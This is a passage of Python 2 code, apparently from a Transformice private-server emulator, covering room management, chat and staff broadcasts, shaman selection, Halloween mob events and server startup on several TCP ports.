            client.sendPlayerDied(client.playerCode, resetpscore)
            client.isDead = True

        if all((client.isDead for client in self.clients.values())):
            self.worldChange()
        return

    def moveAllRoomClients(self, name, rec = False):
        if rec:
            for playerCode, client in self.clients.items():
                self.MoveTimer = reactor.callLater(0, client.enterRoom, self.server.recommendRoom(self.Langue))

        else:
            for playerCode, client in self.clients.items():
                self.MoveTimer = reactor.callLater(0, client.enterRoom, str(name))

    def addClient(self, newClient):
        SPEC = 0
        if self.isCurrentlyPlayingRoom:
            newClient.isDead = True
            SPEC = 1
        self.clients[newClient.playerCode] = newClient
        newClient.room = self
        if self.sNP:
            newClient.sendNewPlayer(newClient.getPlayerData())
        newClient.startPlay(self.ISCM, SPEC)
        if self.isMulodrome:
            for playerCode, client in self.clients.items():
                if client.playerCode == newClient.playerCode:
                    client.sendRoundMulodrome(self.currentRound, self.pTeamBlue, self.pTeamRed)
                    break

        elif self.isDefilante or self.isRacing:
            for playerCode, client in self.clients.items():
                if client.playerCode == newClient.playerCode:
                    client.sendRoundLeader(self.currentRound, self.getLeaderCode())
                    break

        elif self.isMiniGame:
            try:
                self.playerList[newClient.username] = self.__ModuleEmployee(self.__playerList())
                self.__updatePlayerInList(newClient)
            except:
                pass

            try:
                self.GameScript.eventNewPlayer(newClient.username)
            except:
                pass

    def __updatePlayerInList(self, c):
        self.playerList[c.username].playerName = c.username
        self.playerList[c.username].isJumping = c.isJumping
        self.playerList[c.username].title = c.titleNumber
        self.playerList[c.username].y = c.pY
        self.playerList[c.username].x = c.pX
        self.playerList[c.username].isDead = c.isDead
        self.playerList[c.username].look = c.look
        self.playerList[c.username].isShaman = c.isShaman
        self.playerList[c.username].vx = c.Vx
        self.playerList[c.username].score = c.score
        self.playerList[c.username].inHardMode = bool(c.hardMode)
        self.playerList[c.username].vy = c.Vy
        self.playerList[c.username].movingRight = c.movingRight
        self.playerList[c.username].hasCheese = c.hasCheese
        self.playerList[c.username].registrationDate = c.datereg
        self.playerList[c.username].movingLeft = c.movingLeft
        self.playerList[c.username].isFacingRight = c.isFacingRight
        self.playerList[c.username].isVampire = c.isZombie

    def __playerList(self):
        return {'isJumping': False,
         'title': 0,
         'y': 0,
         'x': 0,
         'isDead': False,
         'look': '1;0,0,0,0,0,0,0,0,0',
         'isShaman': False,
         'vx': 0,
         'score': 0,
         'inHardMode': False,
         'vy': 0,
         'movingRight': False,
         'hasCheese': False,
         'registrationDate': 0,
         'playerName': '',
         'movingLeft': False,
         'isFacingRight': False,
         'isVampire': False}

    class __ModuleEmployee(object):

        def __init__(self, *initial_data, **kwargs):
            for dictionary in initial_data:
                for key in dictionary:
                    setattr(self, key, dictionary[key])

            for key in kwargs:
                setattr(self, key, kwargs[key])

    def updatesqlserver(self):
        for playerCode, client in self.clients.items():
            if client.username.startswith('*'):
                pass
            else:
                client.updateSelfSQL()

    def checkRoomIsMulodrome(self):
        if len(self.TeamDrome) == 0:
            self.currentRound = 0
            self.LeaderDrome = None
            self.isRacing = False
            self.isMulodrome = False
            self.roundTime = 120
            self.TeamDrome = {}
            self.pTeamBlue = 0
            self.pTeamRed = 0
        return

    def removeClient(self, removeClient):
        if removeClient.playerCode in self.clients:
            for playerCode, client in self.clients.items():
                if self.isMulodrome:
                    if len(self.TeamDrome) == 0:
                        client.sendPlaceMulodrome(self.currentRound, self.pTeamBlue, self.pTeamRed)
                if playerCode == removeClient.playerCode:
                    if client.username.startswith('*'):
                        pass
                    else:
                        client.updateSelfSQL()

            if self.isMulodrome:
                if len(self.TeamDrome) == 0:
                    self.checkRoomIsMulodrome()
            elif self.isMiniGame:
                try:
                    self.GameScript.eventPlayerLeft(removeClient.username)
                except:
                    pass

                try:
                    del self.playerList[removeClient.username]
                except:
                    pass

            del self.clients[removeClient.playerCode]
            if self.getPlayerCount() == 0:
                if self.isMiniGame:
                    try:
                        mng = self.isInfoMinigame
                        self.server.GameAPIModuleRooms[str(mng[3])]['rooms'].remove(str(mng[1]))
                        self.server.GameAPIModuleRooms[str(mng[3])]['count'] -= 1
                    except:
                        pass

                self.server.closeRoom(self)
                return
            removeClient.sendPlayerDisconnect(removeClient.playerCode)
            if self.currentSyncroniserCode == removeClient.playerCode:
                newSyncroniser = random.choice(self.clients.values())
                newSyncroniser.isSyncroniser = True
                self.currentSyncroniserCode = newSyncroniser.playerCode
                newSyncroniser.sendSynchroniser(newSyncroniser.playerCode)
        self.checkShouldChangeWorld()

    def changeSyncroniserRandom(self):
        newSyncroniser = random.choice(self.clients.values())
        newSyncroniser.isSyncroniser = True
        self.currentSyncroniserCode = newSyncroniser.playerCode
        newSyncroniser.sendSynchroniser(newSyncroniser.playerCode)

    def changeSyncroniserSpecific(self, username):
        newSyncroniser = False
        for room in self.server.rooms.values():
            for playerCode, client in room.clients.items():
                if client.username == username:
                    newSyncroniser = client
                    break

        if newSyncroniser:
            newSyncroniser.isSyncroniser = True
            self.currentSyncroniserCode = newSyncroniser.playerCode
            newSyncroniser.sendSynchroniser(newSyncroniser.playerCode)

    def changeScore(self, playerCode, score):
        for playerCode, client in self.clients.items():
            if client.playerCode == playerCode:
                client.score = score

    def startSnowStorm(self, default = True):
        self.sendAll('\x05\x17', ['0'])
        self.isSnowing = True
        if default:
            self.endSnowStormTimer = reactor.callLater(300, self.endSnowStorm)

    def endSnowStorm(self):
        self.sendAll('\x05\x17', [])
        self.isSnowing = False

    def informAll(self, clientFunction, args):
        for playerCode, client in self.clients.items():
            clientFunction(client, *args)

    def forceEmoteAll(self, emoteCode):
        for playerCode, client in self.clients.items():
            for playerCode2, client2 in self.clients.items():
                p = self.parseByte.ByteArray()
                p.writeInt(playerCode2)
                p.writeByte(emoteCode)
                client.sendPlayerEmote(p.toString(), False)

    def informAllOthers(self, senderClient, clientFunction, args):
        for playerCode, client in self.clients.items():
            if playerCode != senderClient.playerCode:
                clientFunction(client, *args)

    def sendSync(self, eventTokens, data = None):
        for playerCode, client in self.clients.items():
            if client.isSyncroniser:
                reactor.callLater(0, client.sendData, eventTokens, data)

    def sendAll(self, eventTokens, data = None):
        for playerCode, client in self.clients.items():
            client.sendData(eventTokens, data)

    def sendData(self, username, eventTokens, data = None, binary = False):
        if not username:
            for playerCode, client in self.clients.items():
                reactor.callLater(0, client.sendData, eventTokens, data, binary)

        else:
            for playerCode, client in self.clients.items():
                if client.username == username:
                    reactor.callLater(0, client.sendData, eventTokens, data, binary)
                    break

    def sendAllOthers(self, senderClient, eventTokens, data):
        for playerCode, client in self.clients.items():
            if client.playerCode != senderClient.playerCode:
                reactor.callLater(0, client.sendData, eventTokens, data)

    def sendAllOthersAndSelf(self, senderClient, eventTokens, data):
        for playerCode, client in self.clients.items():
            client.sendData(eventTokens, data)

    def sendMsgRoomChat(self, data, username):
        for playerCode, client in self.clients.items():
            if client.muteChat or username in client.ignoredsList:
                pass
            else:
                reactor.callLater(0.1, client.sendData, '\x06\x06', data, True)

    def sendAllChat(self, sendplayerCode, username, message):
        for playerCode, client in self.clients.items():
            if client.muteChat:
                pass
            else:
                sendMessage = struct.pack('!h', len(message)) + message
                reactor.callLater(0.1, client.sendData, '\x06\x06', sendplayerCode + username + '\x03' + sendMessage + '\x00\x00', True)

    def sendAllChatColored(self, sendplayerCode, username, message):
        for playerCode, client in self.clients.items():
            if client.muteChat:
                pass
            else:
                sendMessage = struct.pack('!h', len(message)) + message
                if client.isShaman:
                    username = 'Shaman ' + username[2:]
                    sendMessage = '<CH><B>' + sendMessage[2:] + '</B>'
                else:
                    username = '<N>' + username[2:]
                    sendMessage = '<N>' + sendMessage[2:]
                client.sendMessage('<font color="#' + client.chatcolor + '">[' + username + ']</font> ' + sendMessage)

    def sendAllChatF(self, sendplayerCode, username, message, senderClient):
        for playerCode, client in self.clients.items():
            if int(client.playerCode) == int(senderClient.playerCode):
                if client.muteChat:
                    pass
                else:
                    sendMessage = struct.pack('!h', len(message)) + message
                    reactor.callLater(0, client.sendData, '\x06\x06', sendplayerCode + username + sendMessage + '\x00\x00', True)

    def sendAllChatFColored(self, sendplayerCode, username, message, senderClient):
        for playerCode, client in self.clients.items():
            if int(client.playerCode) == int(senderClient.playerCode):
                if client.muteChat:
                    pass
                else:
                    sendMessage = struct.pack('!h', len(message)) + message
                    if client.isShaman:
                        username = 'Shaman ' + username[2:]
                        sendMessage = '<CH>' + sendMessage[2:]
                    else:
                        username = '<N>' + username[2:]
                        sendMessage = '<N>' + sendMessage[2:]
                    client.sendMessage('<font color="#' + client.chatcolor + '">[' + username + ']</font> ' + sendMessage)

    def sendAllBin(self, eventTokens, data = None):
        for playerCode, client in self.clients.items():
            client.sendData(eventTokens, data, True)

    def sendAllItens(self):
        for playerCode, client in self.clients.items():
            client.GetItemHalloween()

    def sendAllOthersBin(self, senderClient, eventTokens, data):
        for playerCode, client in self.clients.items():
            if client.playerCode != senderClient.playerCode:
                reactor.callLater(0, client.sendData, eventTokens, data, True)

    def sendAllPvSpec(self, eventTokens, privlevels, data = None, binary = None):
        for playerCode, client in self.clients.items():
            if client.privilegeLevel in privlevels:
                if binary:
                    client.sendData(eventTokens, data, True)
                else:
                    client.sendData(eventTokens, data)

    def sendAllPvSpec2(self, eventTokens, privlevels, data = None, binary = None):
        for playerCode, client in self.clients.items():
            if client.privilegeLevel in privlevels:
                if client.privilegeLevel >= 4 and not client.isMapcrew:
                    if binary:
                        client.sendData(eventTokens, data, True)
                    else:
                        client.sendData(eventTokens, data)

    def sendAllPvSpecOthers(self, senderClient, eventTokens, privlevels, data = None, binary = None):
        for playerCode, client in self.clients.items():
            if client.privilegeLevel in privlevels:
                if client.playerCode != senderClient.playerCode:
                    if binary:
                        client.sendData(eventTokens, data, True)
                    else:
                        client.sendData(eventTokens, data)

    def sendTribulleWholeTribeRoom(self, senderClient, eventTokens, data, NotIgnorable = None):
        for playerCode, client in self.clients.items():
            if str(client.TribeCode) == str(senderClient.TribeCode):
                if client.isInTribe:
                    if NotIgnorable:
                        reactor.callLater(0, client.sendTribulleProtocol, eventTokens, data)
                    elif not client.muteTribe:
                        reactor.callLater(0, client.sendTribulleProtocol, eventTokens, data)

    def sendWholeTribeRoom(self, senderClient, eventTokens, data, binary = None, NotIgnorable = None):
        for playerCode, client in self.clients.items():
            if str(client.TribeCode) == str(senderClient.TribeCode):
                if client.isInTribe:
                    if binary:
                        if NotIgnorable:
                            client.sendData(eventTokens, data, True)
                        elif not client.muteTribe:
                            client.sendData(eventTokens, data, True)
                    elif NotIgnorable:
                        client.sendData(eventTokens, data)
                    elif not client.muteTribe:
                        client.sendData(eventTokens, data)

    def sendWholeTribeOthersRoom(self, senderClient, eventTokens, data, binary = None, NotIgnorable = None):
        for playerCode, client in self.clients.items():
            if str(client.TribeCode) == str(senderClient.TribeCode):
                if client.isInTribe:
                    if client.playerCode != senderClient.playerCode:
                        if binary:
                            if NotIgnorable:
                                client.sendData(eventTokens, data, True)
                            elif not client.muteTribe:
                                client.sendData(eventTokens, data, True)
                        elif NotIgnorable:
                            client.sendData(eventTokens, data)
                        elif not client.muteTribe:
                            client.sendData(eventTokens, data)

    def sendWholeServer(self, senderClient, eventTokens, data, binary = None):
        for room in self.server.rooms.values():
            if binary:
                reactor.callLater(0, room.sendAllBin, eventTokens, data)
            else:
                reactor.callLater(0, room.sendAll, eventTokens, data)

    def sendMappersChat(self, senderClient, eventTokens, data, binary = None):
        for room in self.server.rooms.values():
            if binary:
                reactor.callLater(0, room.sendAllPvSpec2, eventTokens, [10,
                 8,
                 6,
                 5,
                 4,
                 3], data, True)
            else:
                reactor.callLater(0, room.sendAllPvSpec2, eventTokens, [10,
                 8,
                 6,
                 5,
                 4,
                 3], data)

    def sendArbChat(self, senderClient, eventTokens, data, binary = None):
        for room in self.server.rooms.values():
            if binary:
                reactor.callLater(0, room.sendAllPvSpec, eventTokens, [10,
                 8,
                 6,
                 5,
                 4,
                 3], data, True)
            else:
                reactor.callLater(0, room.sendAllPvSpec, eventTokens, [10,
                 8,
                 6,
                 5,
                 4,
                 3], data)

    def sendModChat(self, senderClient, eventTokens, data, binary = None):
        for room in self.server.rooms.values():
            if binary:
                reactor.callLater(0, room.sendAllPvSpec, eventTokens, [10,
                 8,
                 6,
                 5], data, True)
            else:
                reactor.callLater(0, room.sendAllPvSpec, eventTokens, [10,
                 8,
                 6,
                 5], data)

    def sendArbChatOthers(self, senderClient, eventTokens, data, binary = None):
        for room in self.server.rooms.values():
            if binary:
                reactor.callLater(0, room.sendAllPvSpecOthers, senderClient, eventTokens, [10,
                 8,
                 6,
                 5,
                 4,
                 3], data, True)
            else:
                reactor.callLater(0, room.sendAllPvSpecOthers, senderClient, eventTokens, [10,
                 8,
                 6,
                 5,
                 4,
                 3], data)

    def sendModChatOthers(self, senderClient, eventTokens, data, binary = None):
        for room in self.server.rooms.values():
            if binary:
                reactor.callLater(0, room.sendAllPvSpecOthers, senderClient, eventTokens, [10,
                 8,
                 6,
                 5], data, True)
            else:
                reactor.callLater(0, room.sendAllPvSpecOthers, senderClient, eventTokens, [10,
                 8,
                 6,
                 5], data)

    def sendArbChatOthersLogin(self, senderClient, eventTokens, name):
        for room in self.server.rooms.values():
            for playerCode, client in room.clients.items():
                if client.privilegeLevel in (10, 8, 6, 5, 4, 3):
                    sname = '-'
                    if client.Langue == 'EN':
                        message = name + ' Conectou-se.'
                    elif client.Langue == 'BR':
                        message = name + ' Acabou De Se Conectar.'
                    elif client.Langue == 'FR':
                        message = name + ' vient de se connecter.'
                    elif client.Langue == 'RU':
                        message = name + ' ???????????.'
                    elif client.Langue == 'TR':
                        message = name + ' \xc3\xa7evrimi\xc3\xa7i oldu.'
                    elif client.Langue == 'CN':
                        message = name + ' ?????.'
                    else:
                        message = '[Servidor] ' + name + ' conectou-se.'
                    client.sendData('\x1a\x06', [sname, message])

    def sendModChatOthersLogin(self, senderClient, eventTokens, name):
        for room in self.server.rooms.values():
            for playerCode, client in room.clients.items():
                if client.privilegeLevel == 10 or client.privilegeLevel == 8 or client.privilegeLevel == 6 or client.privilegeLevel == 5:
                    sname = '-'
                    if client.Langue == 'EN':
                        message = '<R>name+<CH>Conectou-se.'
                    elif client.Langue == 'BR':
                        message = '<R>name+ <CH>Acabou De Se Conectar.'
                    elif client.Langue == 'FR':
                        message = name + ' vient de se connecter.'
                    elif client.Langue == 'RU':
                        message = name + ' ???????????.'
                    elif client.Langue == 'TR':
                        message = name + ' \xc3\xa7evrimi\xc3\xa7i oldu.'
                    elif client.Langue == 'CN':
                        message = name + ' ?????.'
                    else:
                        message = '' + name + ' Acabou De Se Conectar.'
                    client.sendData('\x1a\x05', [sname, message])

    def sendAllStaffInRoom(self, senderClient, eventTokens, data, binary = None):
        for playerCode, client in self.clients.items():
            if client.privilegeLevel == 10 or client.privilegeLevel == 8 or client.privilegeLevel == 6 or client.privilegeLevel == 5 or client.privilegeLevel == 4 or client.privilegeLevel == 3:
                if binary:
                    client.sendData(eventTokens, data, True)
                else:
                    client.sendData(eventTokens, data)

    def sendAllStaffInRoomVoteBan(self, senderClient, selfName, username, bancount):
        for playerCode, client in self.clients.items():
            if client.privilegeLevel == 10 or client.privilegeLevel == 8 or client.privilegeLevel == 6 or client.privilegeLevel == 5 or client.privilegeLevel == 4 or client.privilegeLevel == 3:
                if client.Langue == 'EN':
                    client.sendData('\x06\x14', [selfName + ' Est\xc3\xa1 fazendo Voto Popular Contra ' + username + ' (' + str(bancount) + '/6).'])
                elif client.Langue == 'FR':
                    client.sendData('\x06\x14', [selfName + ' demande le bannissement de ' + username + ' (' + str(bancount) + '/6).'])
                elif client.Langue == 'BR':
                    client.sendData('\x06\x14', [selfName + ' Est\xc3\xa1 fazendo Voto Popular Contra ' + username + ' (' + str(bancount) + '/6).'])
                elif client.Langue == 'RU':
                    client.sendData('\x06\x14', [selfName + ' (This string has not been translated yet [4744]) ' + username + ' (' + str(bancount) + '/6).'])
                elif client.Langue == 'TR':
                    client.sendData('\x06\x14', [selfName + ' (This string has not been translated yet [4746]) ' + username + ' (' + str(bancount) + '/6).'])
                elif client.Langue == 'CN':
                    client.sendData('\x06\x14', [selfName + ' (This string has not been translated yet [4748]) ' + username + ' (' + str(bancount) + '/6).'])
                else:
                    client.sendData('\x06\x14', [selfName + ' requested ban of ' + username + ' (' + str(bancount) + '/6).'])

    def getPlayerCode(self, name, OnlySelf = None):
        if OnlySelf:
            for playerCode, client in self.clients.items():
                if client.username == name:
                    return playerCode
                    break

            return 0
        else:
            for room in self.server.rooms.values():
                for playerCode, client in room.clients.items():
                    if client.username == name:
                        return playerCode
                        break

            return 0

    def getPlayer(self, name):
        for room in self.server.rooms.values():
            for playerCode, client in room.clients.items():
                if client.username == name:
                    return client

        return 0

    def getCurrentSync(self):
        if self.eSync:
            return 'Everyone'
        if self.sSync:
            for playerCode, client in self.clients.items():
                if client.playerCode == self.currentSyncroniserCode:
                    return client.username
                    break

        else:
            return 'Nobody'
        return 0

    def InitEaster(self):
        if self.EasterTimer:
            try:
                self.EasterTimer.cancel()
            except:
                self.EasterTimer = None

        if int(self.getPlayerCount()) >= int(self.server.NeedsForEaster) and not self.isBootcamp and not self.isSurvivor and not self.isTribehouse and not self.isRacing and not self.isEditeur:
            mapnumber = random.choice(['@1'])
            self.forceNextMap = mapnumber
        self.EasterTimer = reactor.callLater(600, self.InitEaster)
        return

    def killAfk(self):
        if self.isBootcamp:
            pass
        elif self.isPlazza:
            pass
        if self.isTribehouseMap:
            pass
        elif self.isEditeur:
            pass
        elif self.isTotemEditeur:
            pass
        elif self.autoRespawn:
            pass
        elif int(self.getTimer() - self.gameStartTime) > 32 or int(self.getTimer() - self.gameStartTime) < 29:
            pass
        else:
            for playerCode, client in self.clients.items():
                if not client.isDead:
                    if client.isAfk == True:
                        client.isDead = True
                        client.score -= 1
                        if client.score < 0:
                            client.score = 0
                        if self.isMiniGame:
                            self.playerList[client.username].isDead = client.isDead
                        client.sendPlayerDied(client.playerCode, client.score)

            self.checkShouldChangeWorld()

    def closeRoomRoundJoin(self):
        self.isCurrentlyPlayingRoom = True

    def killAll(self):
        for playerCode, client in self.clients.items():
            if not client.isDead:
                resetpscore = client.score + 1
                client.sendPlayerDied(client.playerCode, resetpscore)
                client.isDead = True

        self.checkShouldChangeWorld()

    def killAllNoDie(self):
        for playerCode, client in self.clients.items():
            if not client.isDead:
                client.isDead = True

        self.checkShouldChangeWorld()

    def killShaman(self):
        for playerCode, client in self.clients.items():
            if client.playerCode == self.currentShamanCode:
                client.score -= 1
                if client.score < 0:
                    client.score = 0
                client.sendPlayerDied(client.playerCode, client.score)
                client.isDead = True

        self.checkShouldChangeWorld()

    def getPlayerCount(self, UniqueIPs = None):
        if UniqueIPs:
            IPlist = []
            for playerCode, client in self.clients.items():
                if client.address[0] not in IPlist:
                    IPlist.append(client.address[0])

            return len(IPlist)
        else:
            return len(self.clients)

    def getPlayerCount2(self):
        return len(self.clients)

    def getPlayerList(self, Noshop = None):
        if Noshop:
            for playerCode, client in self.clients.items():
                yield client.getPlayerData(True)

        else:
            for playerCode, client in self.clients.items():
                yield client.getPlayerData()

    def spawnMobHalloween(self, m_id = -9999999, m_x = 0, m_y = 0, m_name = '', m_hp = 100):
        self.eventRoomFactory['halloween']['mobiles']['entry'][m_id] = {'m_id': m_id,
         'm_i_x': m_x,
         'm_x': m_x,
         'm_y': m_y,
         'm_name': m_name,
         'm_hp': m_hp}
        p = self.parseByte.ByteArray()
        p.writeInt(m_id)
        p.writeInt(m_x)
        p.writeInt(m_y)
        p.writeUTF(m_name)
        self.sendAllBin('\x1a\x06', p.toString())
        if m_name not in 'chat':
            self.sendMobDirection(m_id)

    def sendMobDirection(self, m_id, m_dir = True, strength = -2):
        p = self.parseByte.ByteArray()
        p.writeInt(m_id)
        p.writeInt(strength)
        self.sendAllBin('\x1a\x08', p.toString())

    def respawnMobHalloween(self, m_name = False, m_x = False):
        map_num = self.eventRoomFactory['halloween']['map']['num']
        if map_num in (0, 1, 2):
            self.eventRoomFactory['halloween']['mobiles']['count'] += 1
            m_count = self.eventRoomFactory['halloween']['mobiles']['count']
            if map_num is 0:
                if m_name in 'f':
                    self.spawnMobHalloween(m_count, 1295, 95, m_name, 10)
                elif m_name in 'sq':
                    if m_x in 570:
                        self.spawnMobHalloween(m_count, 570, 100, m_name, 17)
                    else:
                        self.spawnMobHalloween(m_count, 480, 280, m_name, 15)
            elif map_num is 1:
                if m_name in 'f':
                    self.spawnMobHalloween(m_count, 1900, 350, m_name, 10)
                elif m_name in 'sq':
                    self.spawnMobHalloween(m_count, 1000, 350, m_name, 15)
            elif map_num is 2:
                if m_name in 'f':
                    self.spawnMobHalloween(m_count, 400, 290, m_name, 10)
            else:
                print '[ERROR][Halloween] Room - %s' % self.name

    def getHalloweenMobName(self, m_id):
        return self.eventRoomFactory['halloween']['mobiles']['entry'][m_id]['m_name']

    def damageMobHalloween(self, m_id, m_dir):
        self.eventRoomFactory['halloween']['mobiles']['entry'][m_id]['m_hp'] -= 1
        if self.eventRoomFactory['halloween']['mobiles']['entry'][m_id]['m_hp'] <= 0:
            p = self.parseByte.ByteArray()
            p.writeInt(m_id)
            p.writeByte(m_dir)
            self.sendAllBin('\x1a\x07', p.toString())
            self.removeMobHalloween(m_id)

    def removeMobHalloween(self, m_id):
        hmob = self.eventRoomFactory['halloween']['mobiles']['entry'][m_id]
        m_name, m_x = hmob['m_name'], hmob['m_i_x']
        timing = threading.Timer(2, self.respawnMobHalloween, [m_name, m_x])
        timing.start()
        del self.eventRoomFactory['halloween']['mobiles']['entry'][m_id]

    def getHighestPlayer(self):
        clientscores = []
        clientcode = 0
        for playerCode, client in self.clients.items():
            clientscores.append(client.score)

        for playerCode, client in self.clients.items():
            if client.score == max(clientscores):
                clientcode = playerCode
                clientname = client.username

        return clientcode

    def getHighestShaman(self):
        clientscores = []
        clientcode = 0
        for playerCode, client in self.clients.items():
            clientscores.append(client.score)

        for playerCode, client in self.clients.items():
            if client.score == max(clientscores):
                clientcode = playerCode
                clientname = client.username

        return clientcode

    def getSecondHighestShaman(self):
        clientscores = []
        clientcode = 0
        for playerCode, client in self.clients.items():
            clientscores.append(client.score)

        clientscores.remove(max(clientscores))
        for playerCode, client in self.clients.items():
            if client.score == max(clientscores):
                clientcode = playerCode
                clientname = client.username

        return clientcode

    def getHighestPoint(self):
        clientscores = []
        clientcode = 0
        for playerCode, client in self.clients.items():
            clientscores.append(client.score)

        for playerCode, client in self.clients.items():
            if client.score == max(clientscores):
                clientcode = playerCode
                clientname = client.username

        return clientcode

    def getLeaderCode(self):
        self.currentLeader = self.getHighestPoint()
        return self.currentLeader

    def getShamanCode(self):
        if self.currentShamanCode is None:
            if self.nobodyIsShaman:
                self.currentShamanCode = 0
            elif self.currentWorld in [7,
             8,
             14,
             22,
             23,
             28,
             29,
             42,
             54,
             55,
             57,
             58,
             59,
             60,
             61,
             70,
             77,
             78,
             87,
             88,
             89,
             92,
             122,
             123,
             124,
             125,
             126,
             560,
             561,
             1007,
             888] + range(200, 211):
                self.currentShamanCode = 0
            elif self.SPR_Room and self.spc0:
                self.currentShamanCode = 0
            elif self.ISCMdata[5] in (3, 7, 17, 13, 18, 11, 42):
                self.currentShamanCode = 0
            elif self.ISCM in (42, 89, 561, 923, 924, 925, 926, 927):
                self.currentShamanCode = 0
            elif self.isTribehouseMap:
                self.currentShamanCode = 0
            elif self.everybodyIsShaman:
                self.currentShamanCode = 0
            elif str(self.ISCM) == '1':
                self.currentShamanCode = 0
            else:
                if self.forceNextShaman != False:
                    self.currentShamanCode = self.forceNextShaman
                    self.forceNextShaman = False
                    for playerCode, client in self.clients.items():
                        if client.playerCode == self.currentShamanCode:
                            self.currentShamanName = client.username

                    return self.currentShamanCode
                self.currentShamanCode = self.getHighestPlayer()
        if self.currentShamanCode == 0:
            self.currentShamanName = None
        else:
            for playerCode, client in self.clients.items():
                if client.playerCode == self.currentShamanCode:
                    self.currentShamanName = client.username

        return self.currentShamanCode

    def getDoubleShamanCode(self):
        if self.forceNextShaman != False:
            self.currentShamanCode = self.forceNextShaman
            self.forceNextShaman = False
            if self.currentSecondShamanCode is None:
                self.currentSecondShamanCode = self.getSecondHighestShaman()
                while self.currentSecondShamanCode == self.currentShamanCode:
                    self.currentSecondShamanCode = random.choice(self.clients.keys())

            for playerCode, client in self.clients.items():
                if client.playerCode == self.currentShamanCode:
                    self.currentShamanName = client.username

            for playerCode, client in self.clients.items():
                if client.playerCode == self.currentSecondShamanCode:
                    self.currentSecondShamanName = client.username

            return [self.currentShamanCode, self.currentSecondShamanCode]
        else:
            if self.currentShamanCode is None:
                self.currentShamanCode = self.getHighestPlayer()
            if self.currentSecondShamanCode is None:
                self.currentSecondShamanCode = self.getSecondHighestShaman()
                while self.currentSecondShamanCode == self.currentShamanCode:
                    self.currentSecondShamanCode = random.choice(self.clients.keys())

            for playerCode, client in self.clients.items():
                if client.playerCode == self.currentShamanCode:
                    self.currentShamanName = client.username

            for playerCode, client in self.clients.items():
                if client.playerCode == self.currentSecondShamanCode:
                    self.currentSecondShamanName = client.username

            return [self.currentShamanCode, self.currentSecondShamanCode]
            return

    def getSyncroniserCode(self):
        if self.currentSyncroniserCode is None:
            self.currentSyncroniserCode = random.choice(self.clients.keys())
        return self.currentSyncroniserCode

    def giveSurvivorStats(self):
        if self.isSurvivor and self.getPlayerCount() >= int(self.server.MinMiceFirst):
            for playerCode, client in self.clients.items():
                if not client.SPEC:
                    client.survivorStats[0] += 1
                    if client.isShaman:
                        client.survivorStats[1] += 1
                        client.survivorStats[2] += self.checkDeathCountNoShaman()
                    elif not client.isDead:
                        client.survivorStats[3] += 1


def CleanPycs():
    pattern = '*.pyc'
    for root, dirs, files in os.walk('./'):
        for filename in fnmatch.filter(files, pattern):
            try:
                if os.path.isfile(os.path.join(root, filename)):
                    os.unlink(os.path.join(root, filename))
            except:
                try:
                    if os.path.isfile(os.path.join(root, filename)):
                        os.remove(os.path.join(root, filename))
                except:
                    pass


if __name__ == '__main__':
    if not COMPILE:
        CleanPycs()
    if sys.platform.startswith('win'):
        os.system('title Transformice Server ' + VERSION)
        os.system('color b')
	print"  _____                           ___                                         "
        print" (_   _)                        /'___)                       _                "
        print"   | | _ __   _ _   ___    ___ | (__   _    _ __   ___ ___  (_)   ___    __   "
        print"   | |( '__)/'_` )/' _ `\/',__)| ,__)/'_`\ ( '__)/' _ ` _ `\| | /'___) /'__`\ "
        print"   | || |  ( (_| || ( ) |\__, \| |  ( (_) )| |   | ( ) ( ) || |( (___ (  ___/ "
        print"   (_)(_)  `\__,_)(_) (_)(____/(_)  `\___/'(_)   (_) (_) (_)(_)`\____)`\____) "
    iniports = []
    TFMSERVERX = TransformiceServer()
    for port in [44444,
     44440,
     5555,
     6112,
     3724,
     443]:
	 
        reactor.listenTCP(port, TFMSERVERX)
        iniports.append(port)
    reactor.callWhenRunning(os.system, 'cls')
    reactor.callWhenRunning(sys.stdout.write, ' ' * 80 + str(iniports).center(80) + ' ' * 80)
    reactor.callWhenRunning(sys.stdout.flush)
    reactor.run()
